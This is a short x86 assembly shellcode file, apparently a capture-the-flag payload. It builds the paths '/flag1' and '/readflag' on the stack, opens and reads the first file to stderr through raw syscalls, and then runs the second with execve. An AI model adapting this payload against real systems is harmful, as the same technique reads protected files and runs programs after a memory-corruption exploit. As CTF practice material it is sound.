global _start
_start:
; flag1
    sub esp, 0xff
    mov eax, 0x616c662f
    mov [esp], eax
    mov eax, 0x00003167
    mov [esp+4], eax

    mov eax, 0x5    ; open
    xor ecx, ecx    ; flags
    xor edx, edx    ; mode
    mov ebx, esp    ; filename
    int 0x80
    add esp, 0xff

    mov ebx, eax    ; fd
    mov eax, 0x3    ; read
    mov edx, 0xFF   ; count
    sub esp, 0xff   ; buffer
    mov ecx, esp
    int 0x80

    mov edx, eax    ; count
    mov eax, 0x4    ; write 
    mov ebx, 0x2    ; fd
    mov ecx, esp    ; buffer
    int 0x80
    add esp, 0xff

; flag2
    sub esp, 0xff
    mov eax, 0x6165722f
    mov [esp], eax
    mov eax, 0x616c6664
    mov [esp+4], eax
    mov eax, 0x00000067
    mov [esp+8], eax

    mov eax, 0xb    ; execve 
    mov ebx, esp    ; filename
    xor ecx, ecx    ; argv
    xor edx, edx    ; envp
    int 0x80
    add esp, 0xff

    ret
